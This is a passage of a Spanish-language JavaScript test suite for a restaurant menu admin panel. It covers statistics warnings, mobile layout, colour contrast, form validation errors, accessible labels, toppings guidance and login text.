		totalAgregados: 5, totalClics, tasaAnadido: 100,
		masAgregados: [{ nombre: 'SUPREMA', agregados: 5, clics: clicsPlato }],
	});

	test('con pocas fichas abiertas se da el número y se calla el porcentaje', () => {
		const { ctx, nodos } = montar();
		ctx.renderCarrito(datosCarrito(5, 5));
		assert.equal(nodos.estCarritoResumen.textContent, '5 en total');
		// «% de» y no «%» a secas: la barra lleva width:100% en su estilo.
		assert.doesNotMatch(nodos.estCarrito.innerHTML, /\d+% de/, 'la fila del plato sigue dando «100 % de 5»');
	});

	test('con muestra suficiente, el porcentaje vuelve', () => {
		const { ctx, nodos } = montar();
		ctx.renderCarrito(datosCarrito(40, 25));
		assert.match(nodos.estCarritoResumen.textContent, /100% de las fichas abiertas/);
		assert.match(nodos.estCarrito.innerHTML, /20% de 25/);
	});

	// ── E3 ──────────────────────────────────────────────────────
	test('con pocas visitas se avisa de cuánto pesan los números', () => {
		const { ctx, nodos } = montar();
		ctx.avisoPocosDatos(4);
		assert.equal(nodos.estPocosDatos.style.display, 'block');
		assert.match(nodos.estPocosDatos.textContent, /4 visitas/);
		ctx.avisoPocosDatos(0);
		assert.match(nodos.estPocosDatos.textContent, /todavía no tiene visitas/);
		ctx.avisoPocosDatos(30);
		assert.equal(nodos.estPocosDatos.style.display, 'none');
	});

	// ── M6 y B3 ─────────────────────────────────────────────────
	const plato = (disponible = true) => ({ disponible });
	const ignorados = [{ categoria: 'ENTRADAS', nombre: 'Papas a la francesa' }];

	test('con cero visitas no acusa a la carta', () => {
		// M6: zz-pruebas-ux, recién creado, con su único plato «ignorado».
		const { ctx, nodos } = montar([plato()]);
		ctx.renderIgnorados(ignorados, 0, 1);
		assert.doesNotMatch(texto(nodos.estIgnorados), /Papas/);
		assert.match(texto(nodos.estIgnorados), /Sin visitas/);
		assert.equal(nodos.estIgnoradosResumen.textContent, '');
	});

	test('con menos visitas que platos, lo dice en vez de listar', () => {
		// B3: Bonzas, 27 visitas y 97 platos, «86 en total».
		const { ctx, nodos } = montar();
		ctx.renderIgnorados(ignorados, 27, 97);
		assert.doesNotMatch(texto(nodos.estIgnorados), /Papas/);
		assert.match(texto(nodos.estIgnorados), /al menos 97 en el rango y hay 27/);
	});

	test('una carta pequeña necesita igualmente un mínimo de visitas', () => {
		const { ctx } = montar();
		assert.equal(ctx.visitasParaIgnorados(3), 30);
		assert.equal(ctx.visitasParaIgnorados(97), 97);
	});

	test('con visitas suficientes, la lista sale como siempre', () => {
		const { ctx, nodos } = montar();
		ctx.renderIgnorados(ignorados, 257, 97);
		assert.match(nodos.estIgnorados.innerHTML, /Papas a la francesa/);
		assert.equal(nodos.estIgnoradosResumen.textContent, '1 en total');
	});

	test('los platos que cuentan son los disponibles', () => {
		const { ctx } = montar([plato(), plato(), plato(false)]);
		assert.equal(ctx.platosDisponibles(), 2);
	});

	// ── B3, la segunda mitad ──────────────────────────────────
	test('las categorías que se piden sin abrir la ficha no se listan, y se dice', () => {
		const { ctx, nodos } = montar();
		const lista = [
			{ categoria: 'ENTRADAS', nombre: 'Papas a la francesa' },
			{ categoria: 'CERVEZAS', nombre: 'Águila' }, { categoria: 'CERVEZAS', nombre: 'Corona' },
		];
		ctx.renderIgnorados(lista, 257, 97, ['CERVEZAS']);
		assert.doesNotMatch(nodos.estIgnorados.innerHTML, /Águila|Corona/);
		assert.match(nodos.estIgnorados.innerHTML, /Papas a la francesa/);
		assert.equal(nodos.estIgnoradosResumen.textContent, '1 en total · sin contar «CERVEZAS»');
		ctx.renderIgnorados(lista, 257, 97, ['CERVEZAS', 'BEBIDAS']);
		assert.match(nodos.estIgnoradosResumen.textContent, /sin contar 2 categorías que se piden sin abrir/);
	});

	test('si solo quedaban esas, la carta sale limpia', () => {
		const { ctx, nodos } = montar();
		ctx.renderIgnorados([{ categoria: 'CERVEZAS', nombre: 'Águila' }], 257, 97, ['CERVEZAS']);
		assert.match(nodos.estIgnorados.innerHTML, /Todos los platos disponibles se abrieron/);
	});

	test('sus platos no cuentan para las visitas que hacen falta', () => {
		const cats = [{ id: 'c1', nombre: 'HAMBURGUESAS', atributos: {} }, { id: 'c2', nombre: 'CERVEZAS', atributos: { se_pide_sin_abrir: true } }];
		const prods = [
			{ categoria_id: 'c1' }, { categoria_id: 'c1', disponible: false },
			{ categoria_id: 'c2' }, { categoria_id: 'c2' }, { categoria_id: 'c2' },
		];
		const { ctx } = montar(prods, cats);
		assert.equal(ctx.platosQueSeAbren(), 1);
		assert.equal(ctx.platosDisponibles(), 4, 'el total de la carta no cambia');
		assert.deepEqual([...ctx.categoriasSinAbrir()], ['CERVEZAS']);
	});

	test('cargarEstadisticas pasa las visitas y los platos a la sección', () => {
		const src = fs.readFileSync(path.join(PUBLIC, 'estadisticas.js'), 'utf8');
		assert.match(src, /renderIgnorados\(data\.nuncaAbiertos \|\| \[\], data\.totalVisitas, platosQueSeAbren\(\), categoriasSinAbrir\(\)\)/);
		assert.match(src, /avisoPocosDatos\(data\.totalVisitas\);/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('las pestañas avisan de que hay más fuera de la pantalla', () => {
	// M1 en docs/revision-ux.md. A 375 px, 519 px de pestañas y la barra escondida
	// a mano: la última quedaba 124 px fuera sin nada que lo dijera.
	const src = codigoDelPanel();
	const { bordesConContenido } = cargar('index.html', 'function bordesConContenido', 'function marcarBordesDeTabs', {});

	test('al principio de un carril más ancho que la pantalla, queda contenido a la derecha', () => {
		const b = bordesConContenido({ scrollLeft: 0, clientWidth: 375, scrollWidth: 519 });
		assert.equal(b.derecha, true);
		assert.equal(b.izquierda, false);
	});

	test('a mitad, por los dos lados; al final, solo a la izquierda', () => {
		assert.deepEqual({ ...bordesConContenido({ scrollLeft: 60, clientWidth: 375, scrollWidth: 519 }) }, { izquierda: true, derecha: true });
		assert.deepEqual({ ...bordesConContenido({ scrollLeft: 144, clientWidth: 375, scrollWidth: 519 }) }, { izquierda: true, derecha: false });
	});

	test('si caben todas, no se difumina nada', () => {
		assert.deepEqual({ ...bordesConContenido({ scrollLeft: 0, clientWidth: 1000, scrollWidth: 1000 }) }, { izquierda: false, derecha: false });
	});

	test('el medio píxel del zoom no cuenta como contenido', () => {
		assert.equal(bordesConContenido({ scrollLeft: 143.6, clientWidth: 375, scrollWidth: 519 }).derecha, false);
	});

	test('la barra ya no está escondida', () => {
		const regla = src.match(/\.tabs\{[^}]*\}/)[0];
		assert.doesNotMatch(regla, /scrollbar-width:none/);
		assert.doesNotMatch(src, /\.tabs::-webkit-scrollbar\{display:none;?\}/);
	});

	test('la pestaña pulsada se trae a la vista', () => {
		const cuerpo = src.match(/function switchTab\(tab, btn\) \{[\s\S]*?\n\}/)[0];
		assert.match(cuerpo, /btn\.scrollIntoView\?\.\(\{ block: 'nearest', inline: 'nearest'/);
	});

	test('se vigila desde el arranque y se repinta al cambiar las pestañas visibles', () => {
		const arranque = src.slice(src.indexOf('// ── ARRANQUE'));
		assert.match(arranque, /vigilarBordesDeTabs\(\);/);
		const ajustar = src.match(/function ajustarPestanasAlModelo\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(ajustar, /marcarBordesDeTabs\(\)/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('la fila de categoría cabe en un móvil', () => {
	// M3 en docs/revision-ux.md. A 375 px la fila medía 326 px dentro de una caja de
	// 307, y la única regla móvil que la tocaba ENCOGÍA el botón de borrar.
	const src = codigoDelPanel();
	const bloqueMovil = (() => {
		const i = src.indexOf('@media(max-width:680px){');
		assert.ok(i > 0, 'no se encontró el bloque de móvil');
		// Hasta la llave que lo cierra, contando anidamiento.
		let prof = 0, j = src.indexOf('{', i);
		for (; j < src.length; j++) {
			if (src[j] === '{') prof++;
			else if (src[j] === '}' && --prof === 0) break;
		}
		return src.slice(i, j);
	})();
	const px = (regla, prop) => Number((regla.match(new RegExp(prop + String.raw`\s*:\s*(\d+)px`)) || [])[1] || 0);

	test('la fila se parte en dos en móvil, con los controles abajo', () => {
		assert.match(bloqueMovil, /\.cat-row\{[^}]*flex-wrap:wrap/);
		assert.match(bloqueMovil, /\.cat-acciones\{[^}]*flex-basis:100%[^}]*border-top/);
	});

	test('en móvil el botón de borrar no es más pequeño que en escritorio', () => {
		const base = src.match(/\.btn-del \{[^}]*\}/)[0];
		const movil = bloqueMovil.match(/\.btn-del\s*\{[^}]*\}/)[0];
		assert.ok(px(movil, 'font-size') >= px(base, 'font-size'),
			`borrar pasa de ${px(base, 'font-size')} px a ${px(movil, 'font-size')} px en móvil`);
	});

	test('las flechas y borrar tienen diana de dedo en móvil', () => {
		const regla = bloqueMovil.match(/\.cat-acciones \.btn-edit,\.cat-acciones \.btn-del\{[^}]*\}/);
		assert.ok(regla, 'falta el tamaño mínimo de los controles de la fila');
		assert.ok(px(regla[0], 'min-width') >= 44 && px(regla[0], 'min-height') >= 40);
	});

	test('los tres controles van juntos en su grupo, en el mismo orden', () => {
		const nodo = (tag) => ({
			tag, className: '', textContent: '', style: {}, hijos: [], title: '', type: '', atributos: {},
			dataset: {}, appendChild(h) { this.hijos.push(h); return h; }, addEventListener() {},
			setAttribute(k, v) { this.atributos[k] = String(v); },
		});
		const lista = nodo('div');
		const ctx = cargar('index.html', '// ── LA LÍNEA DE DATOS DE CADA CATEGORÍA', '// Muestra/oculta el campo de imagen', {
			state: {
				categorias: [{ id: 'c1', nombre: 'Hamburguesas', emoji: '🍔' }, { id: 'c2', nombre: 'Bebidas' }],
				productos: [{ categoria_id: 'c1' }],
			},
			document: { getElementById: () => lista, createElement: nodo },
			categoriaVisibleAhora: () => true, describirHorario: () => '',
			moveCat() {}, openEditCatModal() {}, confirmDelete() {},
		});
		ctx.renderCatList();
		const fila = lista.hijos[0];
		assert.equal(fila.hijos.length, 3, 'la fila debería tener emoji, datos y el grupo de controles');
		const acciones = fila.hijos[2];
		assert.equal(acciones.className, 'cat-acciones');
		assert.deepEqual(acciones.hijos.map(h => h.className || h.hijos.map(b => b.textContent).join('')), ['⠿↑↓', 'btn-edit', 'btn-del']);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('en vista clara, el acento sobre su fondo tenue se lee', () => {
	// CL4 en docs/revision-ux.md. El chip SELECCIONADO —el que dice qué filtro está
	// puesto— era lo menos legible de la pantalla: verde #0b8850 sobre su propio
	// fondo al 10 %, 3,55-3,97 según dónde. Se calcula con la paleta del archivo,
	// no con números copiados: si alguien retoca un color, la cuenta cambia sola.
	const src = codigoDelPanel();
	const bloque = sel => src.slice(src.indexOf(sel), src.indexOf('}', src.indexOf(sel)));
	const claro = bloque(':root[data-theme="light"] {');
	const oscuro = bloque(':root {');
	const vari = (b, nombre) => (b.match(new RegExp('--' + nombre + String.raw`:\s*([^;]+);`)) || [])[1]?.trim();
	const hex = h => [1, 3, 5].map(i => parseInt(h.slice(i, i + 2), 16));
	const rgba = v => { const m = v.match(/[\d.]+/g).map(Number); return { c: m.slice(0, 3), a: m[3] ?? 1 }; };
	const lum = c => { const l = c.map(v => { v /= 255; return v <= 0.03928 ? v / 12.92 : ((v + 0.055) / 1.055) ** 2.4; }); return 0.2126 * l[0] + 0.7152 * l[1] + 0.0722 * l[2]; };
	const contraste = (a, b) => { const x = lum(a), y = lum(b); return (Math.max(x, y) + 0.05) / (Math.min(x, y) + 0.05); };
	const sobre = (capa, base) => base.map((v, i) => capa.a * capa.c[i] + (1 - capa.a) * v);

	test('el texto de acento pasa AA sobre --accent-dim en los tres fondos claros', () => {
		const texto = hex(vari(claro, 'accent-texto'));
		const tenue = rgba(vari(claro, 'accent-dim'));
		for (const fondo of ['bg', 'panel', 'card']) {
			const c = contraste(texto, sobre(tenue, hex(vari(claro, fondo))));
			assert.ok(c >= 4.5, `sobre --${fondo} da ${c.toFixed(2)}`);
		}
	});

	test('con el acento de marca no pasaba: la prueba mide el problema real', () => {
		// Si esto dejara de fallar con el color viejo, la prueba de arriba no
		// estaría midiendo lo que dice.
		const tenue = rgba(vari(claro, 'accent-dim'));
		const c = contraste(hex(vari(claro, 'accent')), sobre(tenue, hex(vari(claro, 'bg'))));
		assert.ok(c < 4.5, `el acento de marca daba ${c.toFixed(2)}`);
	});

	test('el chip seleccionado, el botón de acento y el aviso usan el texto de acento', () => {
		for (const regla of [/\.cat-chip\.active\{[^}]*\}/, /\.btn-sm\.accent\{[^}]*\}/, /\.toast\.info\{[^}]*\}/, /\.btn-edit:hover\{[^}]*\}/]) {
			assert.match(src.match(regla)[0], /color:var\(--accent-texto\)/, `${regla} sigue con el acento de marca como texto`);
		}
	});

	test('en la vista oscura no cambia nada', () => {
		assert.equal(vari(oscuro, 'accent-texto'), vari(oscuro, 'accent'));
	});
});

describe('el rango libre de fechas va junto', () => {
	// M7. A 375 px los dos campos caían en filas distintas y el guion quedaba
	// huérfano: «03/09/2026 –» arriba y «09/09/2026» debajo.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
	test('los dos campos y el guion comparten un grupo que no se parte', () => {
		const grupo = src.match(/<span class="rango-campos" style="([^"]*)">([\s\S]*?)<\/span>\s*<\/div>/);
		assert.ok(grupo, 'falta el grupo de los campos del rango');
		assert.doesNotMatch(grupo[1], /flex-wrap:\s*wrap/);
		assert.match(grupo[2], /id="estDesde"[\s\S]*–[\s\S]*id="estHasta"/);
		// Pueden encoger: si no, a 375 px no caben y el grupo desborda.
		for (const id of ['estDesde', 'estHasta']) {
			assert.match(grupo[2].match(new RegExp('<input[^>]*id="' + id + '"[^>]*>'))[0], /min-width:0/);
		}
	});
});

// ═══════════════════════════════════════════════════════════════
describe('los errores de la ficha del plato se dicen todos y en su sitio', () => {
	// F2 en docs/revision-ux.md. Tres return seguidos, el de la categoría sin
	// llevar el foco, todo en un aviso lejos del campo y de uno en uno.
	const { erroresDeFicha } = cargar('index.html', 'function erroresDeFicha', 'const CAMPOS_FICHA', { String, Number });

	test('con los tres vacíos salen los tres, en el orden de la ficha', () => {
		const e = erroresDeFicha({ categoria: '', nombre: '  ', precio: '' });
		assert.deepEqual([...e.map(x => x.campo)], ['editNombre', 'editCategoria', 'editPrecioNum']);
	});

	test('la categoría también es un error de campo, no solo un aviso', () => {
		const e = erroresDeFicha({ categoria: '', nombre: 'Hamburguesa', precio: '22000' });
		assert.equal(e.length, 1);
		assert.equal(e[0].campo, 'editCategoria');
	});

	test('el cero escrito a mano es un precio; vacío o negativo no', () => {
		assert.equal(erroresDeFicha({ categoria: 'c1', nombre: 'Agua', precio: '0' }).length, 0);
		assert.equal(erroresDeFicha({ categoria: 'c1', nombre: 'Agua', precio: '' }).length, 1);
		assert.equal(erroresDeFicha({ categoria: 'c1', nombre: 'Agua', precio: '-5' }).length, 1);
	});

	test('un producto marcado como gratis no pide escribir un precio aparte', () => {
		assert.equal(erroresDeFicha({ categoria: 'c1', nombre: 'Cortesía', precio: '', gratis: true }).length, 0);
	});

	function dom() {
		const nodos = {};
		const nodo = id => {
			const n = {
				id, clases: new Set(), atributos: {}, enfocado: 0, despues: null, insertados: [],
				classList: { add: c => n.clases.add(c), remove: c => n.clases.delete(c) },
				setAttribute(k, v) { n.atributos[k] = String(v); }, removeAttribute(k) { delete n.atributos[k]; },
				focus() { n.enfocado++; }, addEventListener() {},
				// Como un navegador: insertar dos veces deja DOS elementos, aunque tengan
				// el mismo id. Sin esto, un mensaje duplicado pasaba por uno solo.
				insertAdjacentElement(_, el) {
					n.despues = el; n.insertados.push(el); nodos[el.id] = el;
					el.remove = () => { n.insertados = n.insertados.filter(x => x !== el); if (nodos[el.id] === el) delete nodos[el.id]; n.despues = n.insertados.at(-1) || null; };
				},
			};
			return n;
		};
		for (const id of ['editNombre', 'editCategoria', 'editPrecioNum']) nodos[id] = nodo(id);
		return { nodos, document: { getElementById: id => nodos[id] || null, createElement: () => ({}) } };
	}

	test('cada campo con error se marca, se describe y el foco va al primero', () => {
		const { nodos, document } = dom();
		const ctx = cargar('index.html', 'function erroresDeFicha', 'function vigilarErroresFicha', { String, Number, document });
		ctx.pintarErroresFicha(ctx.erroresDeFicha({ categoria: '', nombre: 'Hamburguesa', precio: '' }));
		const cat = nodos.editCategoria, precio = nodos.editPrecioNum;
		assert.ok(cat.clases.has('con-error') && precio.clases.has('con-error'));
		assert.equal(nodos.editNombre.clases.has('con-error'), false);
		assert.equal(cat.atributos['aria-invalid'], 'true');
		assert.equal(cat.atributos['aria-describedby'], 'editCategoriaError');
		assert.match(cat.despues.textContent, /categoría/);
		assert.equal(cat.enfocado, 1, 'el foco no fue a la categoría, el primer campo con error');
		assert.equal(precio.enfocado, 0);
	});

	test('volver a validar no duplica los mensajes, y corregir un campo quita el suyo', () => {
		const { nodos, document } = dom();
		const ctx = cargar('index.html', 'function erroresDeFicha', 'function vigilarErroresFicha', { String, Number, document });
		const errores = ctx.erroresDeFicha({ categoria: '', nombre: '', precio: '1' });
		ctx.pintarErroresFicha(errores);
		ctx.pintarErroresFicha(errores);
		assert.equal(nodos.editNombre.insertados.length, 1, 'el mensaje del nombre salió dos veces');
		assert.equal(nodos.editCategoria.insertados.length, 1, 'el mensaje de la categoría salió dos veces');
		ctx.limpiarErrorDeCampo('editNombre');
		assert.equal(nodos.editNombre.clases.has('con-error'), false);
		assert.equal(nodos.editNombreError, undefined);
		assert.ok(nodos.editCategoriaError, 'limpiar un campo se llevó el error de otro');
	});

	test('saveProduct usa la validación, y al abrir la ficha no quedan errores de la anterior', () => {
		const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		const guardar = src.match(/async function saveProduct\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(guardar, /pintarErroresFicha\(errores\)/);
		assert.doesNotMatch(guardar, /showToast\('Selecciona una categoría'/);
		for (const f of ['function openNewProductModal', 'function openEditProductModal']) {
			const i = src.indexOf(f);
			assert.match(src.slice(i, src.indexOf('\n}', i)), /limpiarErroresFicha\(\)/, `${f} no limpia los errores`);
		}
		assert.match(src.slice(src.indexOf('// ── ARRANQUE')), /vigilarErroresFicha\(\);/);
	});
});

describe('borrar dice qué borra', () => {
	// P6. Un 🗑 con title="Eliminar" y nada más, en una lista de cien filas.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
	test('el de cada plato y el de cada categoría llevan nombre accesible con el nombre', () => {
		assert.match(src, /delBtnMovil\.setAttribute\('aria-label',`Eliminar «\$\{p\.nombre\}»`\)/);
		assert.match(src, /delBtn\.setAttribute\('aria-label',`Eliminar la categoría «\$\{cat\.nombre\}»`\)/);
	});

	test('la fila de categoría pinta ese nombre de verdad', () => {
		const nodo = () => ({ className: '', textContent: '', style: {}, hijos: [], title: '', type: '', atributos: {},
			dataset: {}, appendChild(h) { this.hijos.push(h); return h; }, addEventListener() {}, setAttribute(k, v) { this.atributos[k] = String(v); } });
		const lista = nodo();
		const ctx = cargar('index.html', '// ── LA LÍNEA DE DATOS DE CADA CATEGORÍA', '// Muestra/oculta el campo de imagen', {
			state: { categorias: [{ id: 'c1', nombre: 'Bebidas' }], productos: [] },
			document: { getElementById: () => lista, createElement: nodo },
			categoriaVisibleAhora: () => true, describirHorario: () => '', moveCat() {}, openEditCatModal() {}, confirmDelete() {},
		});
		ctx.renderCatList();
		const borrar = lista.hijos[0].hijos[2].hijos[2];
		assert.equal(borrar.atributos['aria-label'], 'Eliminar la categoría «Bebidas»');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('cada categoría dice cuántos platos tiene, cómo se ve y si sale en la carta', () => {
	// C2 y C3 en docs/revision-ux.md. «3 productos · fotos» no decía qué era
	// «fotos», y una categoría que la carta no enseña se pintaba como las demás.
	const { datosDeCategoria } = cargar('index.html', 'function datosDeCategoria', 'function renderCatList', {});
	const plato = (disponible = true) => ({ disponible });

	test('el modo de presentación se dice con palabras', () => {
		assert.equal(datosDeCategoria([plato(), plato(), plato()], false).texto, '3 platos · con fotos');
		assert.equal(datosDeCategoria([plato()], true).texto, '1 plato · en lista, sin fotos');
	});

	test('sin platos, avisa de que no sale en la carta', () => {
		// La carta la salta: core/menu.js, if (!prods.length) return.
		const d = datosDeCategoria([], false);
		assert.match(d.aviso, /no sale en la carta/);
	});

	test('con platos pero ninguno disponible, tampoco sale, y lo dice', () => {
		// La carta solo carga los disponibles (loader.js, disponible=eq.true), así
		// que para ella esta categoría está vacía. El hallazgo no lo recogía.
		const d = datosDeCategoria([plato(false), plato(false)], false);
		assert.match(d.aviso, /ninguno disponible/);
		assert.match(d.texto, /^2 platos/);
	});

	test('con un solo plato disponible, sale y no avisa', () => {
		assert.equal(datosDeCategoria([plato(false), plato(true)], false).aviso, null);
	});

	test('la fila pinta el aviso junto a los datos', () => {
		const nodo = () => ({ className: '', textContent: '', style: {}, hijos: [], title: '', type: '', atributos: {},
			dataset: {}, appendChild(h) { this.hijos.push(h); return h; }, addEventListener() {}, setAttribute(k, v) { this.atributos[k] = String(v); } });
		const lista = nodo();
		const ctx = cargar('index.html', '// ── LA LÍNEA DE DATOS DE CADA CATEGORÍA', '// Muestra/oculta el campo de imagen', {
			state: { categorias: [{ id: 'c1', nombre: 'Otros' }], productos: [] },
			document: { getElementById: () => lista, createElement: nodo },
			categoriaVisibleAhora: () => true, describirHorario: () => '', moveCat() {}, openEditCatModal() {}, confirmDelete() {},
		});
		ctx.renderCatList();
		const meta = lista.hijos[0].hijos[1].hijos[1];
		assert.equal(meta.textContent, 'Sin platos');
		assert.match(meta.hijos[0].textContent, /no sale en la carta/);
		assert.equal(meta.hijos[0].style.cssText.includes('var(--warn)'), true);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('los grupos de toppings se llaman igual en la pestaña y en la ficha', () => {
	// TP1 en docs/revision-ux.md: «Platino/Premium» en la pestaña y «sin costo/con
	// costo» en la ficha, y Platino sonaba a más que Premium siendo el gratis. La
	// carta del comensal dice «TOPPINGS PLATINO», así que ese nombre se conserva
	// entre paréntesis: es el que el dueño ve publicado.
	const src = codigoDelPanel();

	test('los dos grupos se llaman igual en Ajustes y en la ficha, sin Platino ni Premium', () => {
		// 16/09/2026: «Platino» y «Premium» eran nombres nuestros. La carta
		// también dejó de usarlos (vmenus-app#31), así que el paréntesis que
		// explicaba cómo se llamaban allí sobra.
		// Desde el «<» de la etiqueta, para que quitar etiquetas la quite entera.
		const trozo = (desde, hasta) => src.slice(src.lastIndexOf('<', src.indexOf(desde)), src.indexOf(hasta));
		const ajustes = trozo('id="ajToppingsCuerpo"', 'id="listToppingsSalsas"');
		const ficha = trozo('id="persPlatinoWrap"', 'id="persPremiumChips"');
		for (const texto of [ajustes, ficha]) {
			// Solo lo que se lee: los id de las listas siguen diciendo Platino y
			// Premium, y cambiarlos no aporta nada a nadie.
			const visible = texto.replace(/<!--[\s\S]*?-->/g, '').replace(/<[^>]*>/g, ' ');
			assert.match(visible, /Adicionales sin costo/);
			assert.match(visible, /Adicionales con costo/);
			assert.doesNotMatch(visible, /Platino|Premium/);
		}
	});

	// Que la carta diga «TOPPINGS PLATINO» y «TOPPINGS PREMIUM» se comprobó a mano
	// el 13/09/2026 en vmenus-app/index.html. No se prueba desde aquí: en CI solo
	// se clona este repositorio, y una prueba que lee el otro fallaría allí.

	test('el título de la ventana de añadir usa el nombre claro', () => {
		assert.match(src, /platino: 'Nuevo adicional sin costo', premium: 'Nuevo adicional con costo'/);
	});
});

describe('la pestaña de toppings vacía explica para qué sirve', () => {
	// TP2: tres «Sin elementos» y nada que dijera que un topping no sale en
	// ninguna carta hasta que un plato lo ofrece.
	function montar(catalogo, productos = []) {
		const nodos = {};
		const nodo = () => ({ style: {}, innerHTML: '', textContent: '', appendChild() {}, querySelector: () => ({}) });
		const ctx = cargar('toppings.js', 'function renderToppingList', 'const CONTENEDOR_TOPPING', {
			toppingState: catalogo, esc: x => x, Number,
			// La etiqueta del chip vive más abajo en el archivo, con el tope.
			etiquetaDeTopping: t => t.nombre,
			document: { getElementById: id => (nodos[id] ||= nodo()), createElement: nodo },
		});
		const guia = cargar('toppings.js', '// La guía sale mientras el catálogo esté entero vacío', 'function renderToppingList', {
			toppingState: catalogo, state: { productos },
			document: { getElementById: id => (nodos[id] ||= nodo()) },
		});
		vm.runInContext('pintarGuiaToppings = globalThis.__guia;', Object.assign(ctx, { __guia: guia.pintarGuiaToppings }));
		return { ctx, nodos, guia };
	}

	test('con el catálogo vacío sale la guía, y cada lista dice qué hacer', () => {
		const { ctx, nodos } = montar({ platino: [], premium: [], salsas: [] });
		ctx.renderToppingList('listToppingsPlatino', 'platino');
		assert.equal(nodos.toppingsGuia.style.display, 'block');
		assert.match(nodos.listToppingsPlatino.innerHTML, /Pulsa «\+ Añadir»/);
		assert.doesNotMatch(nodos.listToppingsPlatino.innerHTML, /Sin elementos/);
	});

	test('en cuanto hay uno, la guía se va', () => {
		const catalogo = { platino: [{ id: 't1', nombre: 'Queso' }], premium: [], salsas: [] };
		const { ctx, nodos } = montar(catalogo);
		ctx.renderToppingList('listToppingsPlatino', 'platino');
		assert.equal(nodos.toppingsGuia.style.display, 'none');
	});

	test('con toppings creados y ningún plato que los ofrezca, se avisa', () => {
		// 16/09/2026, a la par que la nota de los filtros: es el mismo caso —lo
		// configuraste y la carta no lo enseña— y desde el panel parece un fallo.
		const catalogo = { platino: [{ id: 't1', nombre: 'Queso' }], premium: [], salsas: [{ id: 't2', nombre: 'Rosada' }] };
		const { guia, nodos } = montar(catalogo, [{ id: 'p1', atributos: { personalizacion: { platino: [], premium: [], salsas: [] } } }]);
		guia.pintarGuiaToppings();
		assert.equal(nodos.toppingsSinUso.style.display, 'block');
		assert.match(nodos.toppingsSinUso.textContent, /2 adicionales creados/);
		assert.match(nodos.toppingsSinUso.textContent, /Personalización/, 'y dice dónde se arregla');
	});

	test('con uno solo, la frase va en singular', () => {
		const { guia, nodos } = montar({ platino: [{ id: 't1', nombre: 'Queso' }], premium: [], salsas: [] }, []);
		guia.pintarGuiaToppings();
		assert.match(nodos.toppingsSinUso.textContent, /un adicional creado/);
	});

	test('basta con que un plato ofrezca uno para que el aviso no salga', () => {
		const catalogo = { platino: [{ id: 't1', nombre: 'Queso' }], premium: [], salsas: [{ id: 't2', nombre: 'Rosada' }] };
		const { guia, nodos } = montar(catalogo, [{ id: 'p1', atributos: { personalizacion: { platino: ['t1'], premium: [], salsas: [] } } }]);
		guia.pintarGuiaToppings();
		assert.equal(nodos.toppingsSinUso.style.display, 'none');
	});

	test('un plato viejo que guarda el NOMBRE cuenta igual', () => {
		// Los anteriores a la migración llevan nombres dentro. Darlos por no
		// usados sería avisar de un problema que no existe.
		const catalogo = { platino: [{ id: 't1', nombre: 'Queso' }], premium: [], salsas: [] };
		const { guia, nodos } = montar(catalogo, [{ id: 'p1', atributos: { personalizacion: { platino: ['Queso'], premium: [], salsas: [] } } }]);
		guia.pintarGuiaToppings();
		assert.equal(nodos.toppingsSinUso.style.display, 'none');
	});

	test('con el catálogo vacío no se avisa: de eso habla la guía', () => {
		const { guia, nodos } = montar({ platino: [], premium: [], salsas: [] }, []);
		guia.pintarGuiaToppings();
		assert.equal(nodos.toppingsGuia.style.display, 'block');
		assert.equal(nodos.toppingsSinUso.style.display, 'none', 'dos mensajes a la vez diciendo lo mismo');
	});

	test('la guía dice que el topping se asigna en la ficha del plato', () => {
		const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		const guia = src.match(/<div id="toppingsGuia"[^>]*>([\s\S]*?)<\/div>/)[1];
		assert.match(guia, /ficha de cada plato/);
		assert.match(guia, /no sale en la carta hasta que algún plato lo ofrece/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('el login: textos claros y la vista clara del sistema', () => {
	// L3, L4 y L5 en docs/revision-ux.md.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');

	test('la etiqueta habla del restaurante, no de un «identificador de acceso»', () => {
		assert.match(src, /<label for="slugInput" class="login-label">Nombre corto de tu restaurante<\/label>/);
		// Sin comentarios: el que explica este cambio cita el texto viejo.
		const visible = src.replace(/<!--[\s\S]*?-->/g, '').replace(/\/\/.*$/gm, '');
		assert.doesNotMatch(visible, /Identificador de acceso/);
		// Y el error de dejarlo vacío habla igual que la etiqueta.
		assert.doesNotMatch(visible, /Ingresa el identificador/);
		assert.match(visible, /textContent='Escribe el nombre corto de tu restaurante'/);
	});

	test('el PIN vacío no parece traer algo escrito', () => {
		const pin = src.match(/<input[^>]*id="pinInput"[\s\S]*?>/)[0];
		assert.doesNotMatch(pin, /placeholder="[·•*.]+"/);
	});

	// ── L5: el tema inicial, con el script real del <head> ──
	const scriptTema = (() => {
		const i = src.indexOf("const elegido = localStorage.getItem('menuAdminTemaElegido');");
		assert.ok(i > 0, 'no se encontró el script de tema del <head>');
		const ini = src.lastIndexOf('try {', i), fin = src.indexOf('} catch (e) {}', i) + '} catch (e) {}'.length;
		return src.slice(ini, fin);
	})();
	function temaAlCargar({ elegido = null, antiguo = null, sistemaClaro = false }) {
		let tema = null;
		const guardado = { menuAdminTemaElegido: elegido, menuAdminTema: antiguo };
		vm.runInNewContext(scriptTema, {
			localStorage: { getItem: k => guardado[k] ?? null },
			window: { matchMedia: q => ({ matches: q.includes('light') && sistemaClaro }) },
			document: { documentElement: { setAttribute: (k, v) => { if (k === 'data-theme') tema = v; } } },
		});
		return tema || 'dark';
	}

	test('sin nada elegido, sigue al sistema', () => {
		assert.equal(temaAlCargar({ sistemaClaro: true }), 'light');
		assert.equal(temaAlCargar({ sistemaClaro: false }), 'dark');
	});

	test('lo elegido con el botón manda sobre el sistema', () => {
		assert.equal(temaAlCargar({ elegido: 'dark', sistemaClaro: true }), 'dark');
		assert.equal(temaAlCargar({ elegido: 'light', sistemaClaro: false }), 'light');
	});

	test('el «oscuro» que el panel guardaba solo, sin elegirlo, ya no tapa al sistema', () => {
